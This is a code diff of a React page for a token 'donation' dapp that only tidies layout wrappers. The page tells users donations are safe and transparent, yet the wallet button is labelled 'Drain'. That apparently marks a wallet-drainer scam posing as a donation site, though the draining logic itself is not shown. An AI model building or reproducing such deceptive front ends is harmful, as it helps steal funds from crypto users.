@@ -69,69 +69,62 @@ return (
 
     {/* Price ticker */}
     <div className="pt-[84px]">
-      {/* Price ticker - full width with centered content */}
-      <div className="w-full">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <PriceTicker />
-        </div>
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <PriceTicker />
       </div>
 
-      {/* Main content wrapper - full width with centered content */}
-      <div className="w-full">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <main className="flex flex-col items-center gap-6 py-8">
-            <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
-              MVP Donation Dapp
-            </h1>
+      {/* Main content wrapper */}
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <main className="flex flex-col items-center gap-6 py-8">
+          <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
+            MVP Donation Dapp
+          </h1>
 
-            <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
-              Donate your tokens across chains in one click — safe, fast, and transparent.
-            </p>
+          <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
+            Donate your tokens across chains in one click — safe, fast, and transparent.
+          </p>
 
-            {/* How it Works + Donate */}
-            <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
-              <div className="flex-shrink-0">
-                <GuideModal />
-              </div>
-
-              <div className="flex-shrink-0">
-                {isConnected ? (
-                  <button
-                    onClick={handleDonate}
-                    disabled={status === "running"}
-                    className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
-                  >
-                    {status === "running" ? "Processing…" : "Drain"}
-                  </button>
-                ) : (
-                  <p className="text-gray-400 italic text-center">
-                    🔌 Connect your wallet to see the donate button
-                  </p>
-                )}
-              </div>
+          {/* How it Works + Donate */}
+          <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
+            <div className="flex-shrink-0">
+              <GuideModal />
             </div>
 
-            {/* Status panel */}
-            <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
-              <div className="flex items-start justify-between">
-                <div>
-                  <strong>Status:</strong> <span className="ml-2">{status}</span>
-                </div>
-                <div className="text-xs text-gray-400">Dev output</div>
-              </div>
-              <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
-                {JSON.stringify(last, null, 2)}
-              </pre>
+            <div className="flex-shrink-0">
+              {isConnected ? (
+                <button
+                  onClick={handleDonate}
+                  disabled={status === "running"}
+                  className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
+                >
+                  {status === "running" ? "Processing…" : "Drain"}
+                </button>
+              ) : (
+                <p className="text-gray-400 italic text-center">
+                  🔌 Connect your wallet to see the donate button
+                </p>
+              )}
             </div>
-          </main>
-        </div>
+          </div>
+
+          {/* Status panel */}
+          <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
+            <div className="flex items-start justify-between">
+              <div>
+                <strong>Status:</strong> <span className="ml-2">{status}</span>
+              </div>
+              <div className="text-xs text-gray-400">Dev output</div>
+            </div>
+            <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
+              {JSON.stringify(last, null, 2)}
+            </pre>
+          </div>
+        </main>
       </div>
 
-      {/* Footer - full width with centered content */}
-      <div className="w-full">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-          <Footer />
-        </div>
+      {/* Footer */}
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <Footer />
       </div>
     </div>
 
